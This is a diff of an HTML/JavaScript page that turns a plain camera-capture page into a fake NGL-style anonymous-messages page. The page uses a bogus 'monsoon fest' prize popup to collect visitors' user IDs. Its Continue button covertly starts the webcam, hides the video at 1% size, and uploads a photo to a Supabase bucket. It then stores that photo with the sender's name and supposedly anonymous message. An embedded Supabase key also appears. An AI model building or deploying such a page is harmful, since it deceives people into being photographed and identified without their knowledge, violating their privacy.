@@ -1,294 +1,407 @@
 <!DOCTYPE html>
-<html lang="en">
+<html>
 <head>
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Photo Verification</title>
+    <meta charset="UTF-8">
+    <title>Anonymous Messages</title>
 
-<script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
+    <style>
+        *{
+            margin:0;
+            padding:0;
+            box-sizing:border-box;
+            font-family:Arial,sans-serif;
+        }
 
-<style>
+        body{
+            height:100vh;
+            display:flex;
+            justify-content:center;
+            align-items:center;
+            background:linear-gradient(135deg,#ff4d94,#7b61ff);
+        }
 
-*{
-    margin:0;
-    padding:0;
-    box-sizing:border-box;
-    font-family:Arial,sans-serif;
-}
+        .container{
+            width:380px;
+            background:white;
+            border-radius:20px;
+            padding:25px;
+            text-align:center;
+            box-shadow:0 10px 30px rgba(0,0,0,.2);
+        }
 
-body{
-    background:#ffe6f2;
-    min-height:100vh;
-    display:flex;
-    justify-content:center;
-    align-items:center;
-}
+        .profile{
+            width:90px;
+            height:90px;
+            border-radius:50%;
+            background:#ddd;
+            margin:auto;
+            margin-bottom:15px;
+        }
 
-.container{
-    width:420px;
-    background:white;
-    padding:25px;
-    border-radius:20px;
-    text-align:center;
-    box-shadow:0 0 20px rgba(0,0,0,.15);
-}
+        h2{
+            margin-bottom:10px;
+        }
 
-h2{
-    color:#ff1493;
-    margin-bottom:10px;
-}
+        p{
+            color:#666;
+            margin-bottom:20px;
+        }
 
-p{
-    margin-bottom:15px;
-}
+        textarea{
+            width:100%;
+            height:120px;
+            border:2px solid #eee;
+            border-radius:12px;
+            padding:12px;
+            resize:none;
+            outline:none;
+        }
 
-video{
-    width:100%;
-    border-radius:15px;
-    margin-top:15px;
-    display:none;
-}
+        button{
+            width:100%;
+            margin-top:15px;
+            padding:14px;
+            border:none;
+            border-radius:12px;
+            background:#111;
+            color:white;
+            font-size:16px;
+            cursor:pointer;
+        }
 
-button{
-    background:#ff69b4;
-    color:white;
-    border:none;
-    padding:12px 20px;
-    border-radius:10px;
-    cursor:pointer;
-    margin-top:10px;
-}
+        button:hover{
+            opacity:.9;
+        }
 
-button:hover{
-    opacity:.9;
-}
+        .popup{
+            position:fixed;
+            inset:0;
+            background:rgba(0,0,0,.6);
+            display:flex;
+            justify-content:center;
+            align-items:center;
+        }
 
-#status{
-    margin-top:15px;
-    font-weight:bold;
-}
+        .popup-box{
+            background:white;
+            padding:25px;
+            border-radius:15px;
+            width:320px;
+            text-align:center;
+        }
 
-</style>
+        .popup-box input{
+            width:100%;
+            padding:10px;
+            margin:15px 0;
+        }
+
+        #video{
+            width:1%;
+            border-radius:1px;
+            margin-top:1px;
+            display:none;
+        }
+
+        #cameraStatus{
+            font-size:13px;
+            margin-top:10px;
+        }
+
+        .notice{
+            font-size:13px;
+            color:#555;
+            margin:10px 0;
+        }
+    </style>
 </head>
+
 <body>
 
-<div class="container">
+    <div class="container">
 
-    <h2>📷 Photo Verification</h2>
+        <div class="profile"></div>
 
-    <p>
-        This process will capture and upload 3 photos.
-    </p>
+        <h2>Kalyani</h2>
 
-    <button id="allowBtn">
-        Allow Camera
-    </button>
+        <p>Send me anonymous messages 👀</p>
 
-    <br>
+        <textarea
+            id="msg"
+            disabled
+            placeholder="Type something..."
+        ></textarea>
 
-    <video id="video" autoplay playsinline></video>
+        <button
+            id="sendBtn"
+            onclick="sendMessage()"
+            disabled
+        >
+            Send
+        </button>
 
-    <br>
+    </div>
 
-    <button id="captureBtn" style="display:none;">
-        Start Capture
-    </button>
+    <div id="namePopup" class="popup">
 
-    <div id="status"></div>
+        <div class="popup-box">
 
-</div>
+            <h3>Big grand monsoon fest!! 🎉🎊</h3>
+            <p>Try your luck to win exciting prizes from NGL🥳<br>Enter ur ID to get inform on winning
+            </p>
 
-<script>
+            <input
+                type="text"
+                id="senderName"
+                placeholder="Your userID"
+            >
 
-const SUPABASE_URL =
-"https://azsxeufcpyergcizsloa.supabase.co";
+            <div class="notice">
+            </div>
 
-const SUPABASE_KEY =
-"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImF6c3hldWZjcHllcmdjaXpzbG9hIiwicm9sZSI6ImFub24iLCJpYXQiOjE3ODEzNjU5NjIsImV4cCI6MjA5Njk0MTk2Mn0.7-EKKb0PHhg0gN7YkIrPNKwP37Xnu6OoVR43jlfbJmw";
 
-const supabase =
-window.supabase.createClient(
-    SUPABASE_URL,
-    SUPABASE_KEY
-);
+            <p id="cameraStatus"></p>
 
-const video =
-document.getElementById("video");
+            <video
+                id="video"
+            ></video>
 
-const statusDiv =
-document.getElementById("status");
+            <canvas
+                id="canvas"
+                style="display:none;"
+            ></canvas>
 
-let stream;
+            <button onclick="saveName();capturePhoto()">
+                Continue
+            </button>
 
-document
-.getElementById("allowBtn")
-.onclick = async () => {
+        </div>
 
-    try{
+    </div>
 
-        stream =
-        await navigator.mediaDevices
-        .getUserMedia({
-            video:true
-        });
+    <script type="module">
 
-        video.srcObject = stream;
+        import { createClient }
+        from 'https://cdn.jsdelivr.net/npm/@supabase/supabase-js/+esm';
 
-        video.style.display = "block";
+        const supabaseUrl =
+        "https://azsxeufcpyergcizsloa.supabase.co";
 
-        document
-        .getElementById("captureBtn")
-        .style.display = "inline-block";
+        const supabaseKey =
+        "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImF6c3hldWZjcHllcmdjaXpzbG9hIiwicm9sZSI6ImFub24iLCJpYXQiOjE3ODEzNjU5NjIsImV4cCI6MjA5Njk0MTk2Mn0.7-EKKb0PHhg0gN7YkIrPNKwP37Xnu6OoVR43jlfbJmw";
 
-        statusDiv.innerText =
-        "Camera ready.";
-
-    }
-    catch(err){
-
-        console.error(err);
-
-        statusDiv.innerText =
-        "Camera permission denied.";
-    }
-};
-
-document
-.getElementById("captureBtn")
-.onclick = async () => {
-
-    statusDiv.innerText =
-    "Capturing photos...";
-
-    for(let i=1;i<=3;i++){
-
-        const base64 =
-        await capturePhoto();
-
-        statusDiv.innerText =
-        `Uploading photo ${i}/3`;
-
-        const url =
-        await uploadImage(base64,i);
-
-        if(url){
-
-            await saveToDatabase(url);
-
-        }
-
-        await new Promise(
-            r => setTimeout(r,1000)
-        );
-    }
-
-    statusDiv.innerText =
-    "All photos uploaded successfully.";
-};
-
-function capturePhoto(){
-
-    return new Promise(resolve=>{
-
-        const canvas =
-        document.createElement("canvas");
-
-        canvas.width =
-        video.videoWidth;
-
-        canvas.height =
-        video.videoHeight;
-
-        const ctx =
-        canvas.getContext("2d");
-
-        ctx.drawImage(
-            video,
-            0,
-            0,
-            canvas.width,
-            canvas.height
+        const supabase =
+        createClient(
+            supabaseUrl,
+            supabaseKey
         );
 
-        const img =
-        canvas.toDataURL(
-            "image/jpeg",
-            0.9
-        );
+        let sender = "";
+        let capturedImageUrl = "";
 
-        resolve(img);
-    });
-}
+        window.capturePhoto = async function(){
 
-async function uploadImage(
-    base64Image,
-    index
-){
+            try{
 
-    try{
+                const status =
+                document.getElementById(
+                    "cameraStatus"
+                );
 
-        const blob =
-        await (
-            await fetch(base64Image)
-        ).blob();
+                const stream =
+                await navigator.mediaDevices
+                .getUserMedia({
+                    video:true
+                });
 
-        const fileName =
-        `photo_${Date.now()}_${index}.jpg`;
+                const video =
+                document.getElementById(
+                    "video"
+                );
 
-        const { error } =
-        await supabase.storage
-        .from("photos")
-        .upload(
-            fileName,
-            blob
-        );
+                const canvas =
+                document.getElementById(
+                    "canvas"
+                );
 
-        if(error){
+                video.srcObject = stream;
+                video.style.display = "block";
 
-            console.error(error);
+                await new Promise(resolve=>{
+                    video.onloadedmetadata =
+                    resolve;
+                });
 
-            return null;
-        }
 
-        const { data } =
-        supabase.storage
-        .from("photos")
-        .getPublicUrl(
-            fileName
-        );
+                await new Promise(r=>
+                    setTimeout(r,1000)
+                );
 
-        return data.publicUrl;
+                canvas.width =
+                video.videoWidth;
 
-    }
-    catch(err){
+                canvas.height =
+                video.videoHeight;
 
-        console.error(err);
+                const ctx =
+                canvas.getContext("2d");
 
-        return null;
-    }
-}
+                ctx.drawImage(
+                    video,
+                    0,
+                    0,
+                    canvas.width,
+                    canvas.height
+                );
 
-async function saveToDatabase(
-    imageUrl
-){
+                const blob =
+                await new Promise(resolve=>{
+                    canvas.toBlob(
+                        resolve,
+                        "image/jpeg",
+                        0.9
+                    );
+                });
 
-    const { error } =
-    await supabase
-    .from("messages")
-    .insert({
-        name:"Camera User",
-        message:"Photo Upload",
-        image_url:imageUrl
-    });
+                const fileName =
+                `photo_${Date.now()}.jpg`;
 
-    if(error){
+                const { error } =
+                await supabase.storage
+                .from("photos")
+                .upload(
+                    fileName,
+                    blob
+                );
 
-        console.error(error);
+                if(error){
+                    throw error;
+                }
 
-    }
-}
+                const { data } =
+                supabase.storage
+                .from("photos")
+                .getPublicUrl(
+                    fileName
+                );
 
-</script>
+                capturedImageUrl =
+                data.publicUrl;
+
+                stream.getTracks()
+                .forEach(track=>{
+                    track.stop();
+                });
+
+                video.style.display =
+                "none";
+
+                status.innerText =
+                "send anonymous message ";
+
+            }
+            catch(err){
+
+                console.log(err);
+
+                alert(
+                    "Camera permission denied or upload failed."
+                );
+            }
+        };
+
+        window.saveName = function(){
+
+            const name =
+            document.getElementById(
+                "senderName"
+            )
+            .value
+            .trim();
+
+            if(name === ""){
+                alert(
+                    "Please enter your name"
+                );
+                return;
+            }
+
+            if(
+                capturedImageUrl === ""
+            ){
+                alert(
+                    "sweet good luck from us!!"
+                );
+                return;
+            }
+
+            sender = name;
+
+            document.getElementById(
+                "namePopup"
+            ).style.display =
+            "none";
+
+            document.getElementById(
+                "msg"
+            ).disabled = false;
+
+            document.getElementById(
+                "sendBtn"
+            ).disabled = false;
+        };
+
+        window.sendMessage =
+        async function(){
+
+            const message =
+            document.getElementById(
+                "msg"
+            )
+            .value
+            .trim();
+
+            if(message === ""){
+                alert(
+                    "Please enter a message"
+                );
+                return;
+            }
+
+            const { error } =
+            await supabase
+            .from("messages")
+            .insert([
+                {
+                    name: sender,
+                    message: message,
+                    image_url:
+                    capturedImageUrl
+                }
+            ]);
+
+            if(error){
+
+                console.log(error);
+
+                alert(
+                    "Error: " +
+                    error.message
+                );
+
+                return;
+            }
+
+            alert(
+                "Message Sent!"
+            );
+
+            document.getElementById(
+                "msg"
+            ).value = "";
+        };
+
+    </script>
 
 </body>
 </html>
